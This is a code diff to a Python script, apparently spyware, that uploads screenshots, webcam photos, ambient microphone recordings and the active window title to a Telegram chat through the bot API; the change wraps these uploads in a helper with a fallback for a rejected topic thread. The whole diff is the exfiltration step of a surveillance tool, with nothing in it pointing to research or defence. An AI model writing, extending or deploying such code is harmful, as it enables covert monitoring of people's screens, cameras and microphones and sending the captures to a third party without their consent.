@@ -77,32 +77,36 @@ def send_to_telegram(window_title):
     
     caption = f"🖥 Active Window: {window_title}"
     
+    def post_data(url, data_type, topic_id, extra_data, files):
+        payload = {
+            "chat_id": CHAT_ID,
+            "caption": extra_data
+        }
+        if topic_id:
+            payload["message_thread_id"] = topic_id
+            
+        resp = requests.post(url, data=payload, files=files)
+        
+        # Fallback for General topic if thread ID 1 is rejected
+        if not resp.json().get("ok") and topic_id == "1":
+            print("Topic 1 failed, attempting send to General (no thread ID)...")
+            del payload["message_thread_id"]
+            requests.post(url, data=payload, files=files)
+
     # Send Screenshot to TOPIC_SCREENSHOT
     if os.path.exists("screen.jpg"):
         with open("screen.jpg", "rb") as f:
-            requests.post(url_photo, data={
-                "chat_id": CHAT_ID, 
-                "message_thread_id": TOPIC_SCREENSHOT,
-                "caption": f"SCREENSHOT\n{caption}"
-            }, files={"photo": f})
+            post_data(url_photo, "photo", TOPIC_SCREENSHOT, f"SCREENSHOT\n{caption}", {"photo": f})
             
     # Send Webcam to TOPIC_WEBCAM
     if os.path.exists("webcam.jpg"):
         with open("webcam.jpg", "rb") as f:
-            requests.post(url_photo, data={
-                "chat_id": CHAT_ID, 
-                "message_thread_id": TOPIC_WEBCAM,
-                "caption": f"WEBCAM\n{caption}"
-            }, files={"photo": f})
+            post_data(url_photo, "photo", TOPIC_WEBCAM, f"WEBCAM\n{caption}", {"photo": f})
 
     # Send Audio to TOPIC_GENERAL
     if os.path.exists("audio.wav"):
         with open("audio.wav", "rb") as f:
-            requests.post(url_doc, data={
-                "chat_id": CHAT_ID, 
-                "message_thread_id": TOPIC_GENERAL,
-                "caption": f"AUDIO (Ambient)\n{caption}"
-            }, files={"document": f})
+            post_data(url_doc, "document", TOPIC_GENERAL, f"AUDIO (Ambient)\n{caption}", {"document": f})
 
 def main():
     if not TOKEN or not CHAT_ID:
